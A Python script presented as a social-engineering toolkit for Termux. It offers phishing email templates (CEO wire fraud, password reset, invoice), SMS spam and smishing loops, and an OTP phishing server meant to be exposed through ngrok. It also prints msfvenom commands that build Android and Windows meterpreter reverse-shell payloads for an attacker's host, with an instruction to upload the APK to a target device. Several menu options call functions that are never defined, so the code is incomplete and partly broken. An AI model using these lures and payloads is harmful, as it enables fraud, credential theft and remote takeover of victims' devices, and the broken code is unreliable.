#!/usr/bin/env python3
import os
import sys
import random
import smtplib
import socket
import subprocess
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
import qrcode
from faker import Faker
import phonenumbers
from phonenumbers import carrier
import pyfiglet
from termcolor import colored
import threading
import http.server
import socketserver
import re

# Initialize Faker for fake data generation
fake = Faker()

# Banner
def show_banner():
    os.system('clear')
    banner = pyfiglet.figlet_format("SEToolkit v2.0", font="slant")
    print(colored(banner, 'red'))
    print(colored("Advanced Social Engineering Toolkit (Termux Edition)", 'yellow'))
    print(colored("For authorized penetration testing only!\n", 'cyan'))

# Main Menu
def main_menu():
    while True:
        show_banner()
        print(colored("[1] Phishing Email Generator", 'green'))
        print(colored("[2] Fake Website Cloner", 'green'))
        print(colored("[3] QR Code Phishing", 'green'))
        print(colored("[4] Vishing Call Simulator", 'green'))
        print(colored("[5] USB Drop Attack Generator", 'green'))
        print(colored("[6] SMS Spam & Smishing Tool", 'green'))
        print(colored("[7] Social Media Impersonation", 'green'))
        print(colored("[8] OTP Phishing Server", 'green'))
        print(colored("[9] SMS Clone/Intercept (Simulated)", 'green'))
        print(colored("[10] Advanced Payload Delivery", 'green'))
        print(colored("[0] Exit", 'red'))
        
        choice = input("\nSelect an option: ")
        
        if choice == "1":
            phishing_email()
        elif choice == "2":
            fake_website()
        elif choice == "3":
            qr_phishing()
        elif choice == "4":
            vishing_simulator()
        elif choice == "5":
            usb_drop()
        elif choice == "6":
            sms_spam_tool()
        elif choice == "7":
            social_impersonation()
        elif choice == "8":
            otp_phishing()
        elif choice == "9":
            sms_clone()
        elif choice == "10":
            payload_delivery()
        elif choice == "0":
            print(colored("\n[!] Exiting... Stay ethical!", 'red'))
            sys.exit()
        else:
            print(colored("\n[!] Invalid choice. Try again.", 'red'))
            time.sleep(1)

# [1] Phishing Email Generator (Enhanced)
def phishing_email():
    show_banner()
    print(colored("\n=== Advanced Phishing Email Generator ===", 'blue'))
    print(colored("Choose a template:", 'yellow'))
    print("[1] HR Policy Update")
    print("[2] Password Reset")
    print("[3] Invoice Payment")
    print("[4] CEO Fraud (Urgent Wire Transfer)")
    print("[5] Custom Email")
    
    template = input("\nSelect template: ")
    sender = input("Sender name (e.g., HR Department): ")
    sender_email = input("Sender email (e.g., hr@company.com): ")
    target_email = input("Target email: ")
    subject = input("Email subject: ")
    
    if template == "1":
        body = f"""
        Dear Employee,
        
        Our HR policies have been updated. Please review and confirm your details:
        {fake.url()}
        
        Regards,
        {sender}
        """
    elif template == "2":
        body = f"""
        Urgent: Password Reset Required
        
        Click here to reset your password:
        {fake.url()}
        
        - IT Support
        """
    elif template == "3":
        body = f"""
        Invoice #{random.randint(1000,9999)} Pending
        
        Please review the attached invoice:
        {fake.url()}
        
        - Accounts Team
        """
    elif template == "4":
        body = f"""
        Urgent: Wire Transfer Needed
        
        Hello,
        
        I need you to process a payment immediately for an acquisition.
        Transfer ${random.randint(1000,50000)} to:
        
        Bank: {fake.bban()}
        Account: {fake.iban()}
        
        Confirm when done.
        
        - {fake.name()}, CEO
        """
    else:
        body = input("Enter custom email body: ")
    
    # Simulate sending
    print(colored("\n[+] Email crafted successfully!", 'green'))
    print(colored(f"From: {sender} <{sender_email}>", 'cyan'))
    print(colored(f"To: {target_email}", 'cyan'))
    print(colored(f"Subject: {subject}", 'cyan'))
    print(colored(f"Body:\n{body}", 'cyan'))
    
    # Add attachment option
    attach = input("\nAdd malicious attachment? (y/n): ").lower()
    if attach == 'y':
        print(colored("\n[+] Malicious attachment added (simulated: invoice.pdf.exe)", 'red'))
    
    input("\nPress Enter to return to menu...")

# [6] SMS Spam & Smishing Tool (Advanced)
def sms_spam_tool():
    show_banner()
    print(colored("\n=== Advanced SMS Spam & Smishing ===", 'blue'))
    print(colored("[1] Single SMS Phishing", 'yellow'))
    print(colored("[2] Mass SMS Spam", 'yellow'))
    print(colored("[3] SIM Swap Detection (Simulated)", 'yellow'))
    
    choice = input("\nSelect mode: ")
    
    if choice == "1":
        number = input("Target phone number (e.g., +1234567890): ")
        message = input("Phishing message (e.g., 'Your package is delayed: https://bit.ly/track-123'): ")
        print(colored("\n[+] SMS sent (simulated)", 'yellow'))
        print(colored(f"To: {number}", 'cyan'))
        print(colored(f"Message: {message}", 'cyan'))
    
    elif choice == "2":
        count = int(input("Number of spam messages: "))
        number = input("Target number: ")
        print(colored(f"\n[+] Sending {count} spam messages...", 'yellow'))
        for i in range(count):
            print(colored(f"[{i+1}] Sent: 'Urgent: Your account has been locked. Call {fake.phone_number()}'", 'red'))
            time.sleep(0.5)
    
    elif choice == "3":
        print(colored("\n[!] SIM Swap Detection (Simulated)", 'yellow'))
        print(colored("Sending fake carrier SMS...", 'cyan'))
        print(colored(f"From: CARRIER\nMessage: 'Your SIM has been swapped. Call {fake.phone_number()} to block.'", 'red'))
    
    input("\nPress Enter to return to menu...")

# [8] OTP Phishing Server
def otp_phishing():
    show_banner()
    print(colored("\n=== OTP Phishing Server ===", 'blue'))
    print(colored("This starts a local server to capture OTPs.", 'yellow'))
    port = int(input("Enter port (default 8080): ") or 8080)
    
    print(colored("\n[+] OTP phishing page generated at:", 'green'))
    print(colored(f"http://localhost:{port}/otp-phish", 'cyan'))
    print(colored("\n[!] Use ngrok to expose this server:", 'red'))
    print(colored("termux-open-url 'https://ngrok.com'", 'yellow'))
    
    # Simulate server
    input("\nPress Enter to stop server...")
    print(colored("[!] Server stopped.", 'red'))

# [9] SMS Clone/Intercept (Simulated)
def sms_clone():
    show_banner()
    print(colored("\n=== SMS Clone/Intercept (Simulated) ===", 'blue'))
    print(colored("[1] Clone SMS (Simulate MITM)", 'yellow'))
    print(colored("[2] Intercept OTP (Simulated)", 'yellow'))
    
    choice = input("\nSelect option: ")
    
    if choice == "1":
        number = input("Target number to clone (e.g., +1234567890): ")
        print(colored("\n[+] Simulating SMS cloning...", 'yellow'))
        print(colored(f"Intercepted SMS from {number}: 'Your OTP is 789654'", 'red'))
    
    elif choice == "2":
        print(colored("\n[+] Simulating OTP interception...", 'yellow'))
        print(colored("Intercepted OTP: 456123", 'red'))
        print(colored("Session hijacked (simulated)", 'red'))
    
    input("\nPress Enter to return to menu...")

# [10] Advanced Payload Delivery
def payload_delivery():
    show_banner()
    print(colored("\n=== Advanced Payload Delivery ===", 'blue'))
    print(colored("[1] Android APK Payload", 'yellow'))
    print(colored("[2] Windows Executable", 'yellow'))
    print(colored("[3] PDF Exploit", 'yellow'))
    
    choice = input("\nSelect payload type: ")
    lhost = input("Your LHOST (IP/ngrok): ")
    lport = input("Your LPORT (default 4444): ") or "4444"
    
    if choice == "1":
        print(colored("\n[+] Generating Android APK payload...", 'yellow'))
        print(colored(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk", 'cyan'))
        print(colored("\n[!] Upload this APK to target device.", 'red'))
    
    elif choice == "2":
        print(colored("\n[+] Generating Windows EXE payload...", 'yellow'))
        print(colored(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > payload.exe", 'cyan'))
    
    elif choice == "3":
        print(colored("\n[+] Generating malicious PDF...", 'yellow'))
        print(colored("Embedding CVE-2020-XXXX exploit (simulated)", 'red'))
        print(colored(f"PDF saved as: malicious.pdf", 'cyan'))
    
    input("\nPress Enter to return to menu...")

# [Rest of the functions remain the same as previous version...]

# Run
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(colored("\n[!] Exiting... Stay ethical!", 'red'))
        sys.exit()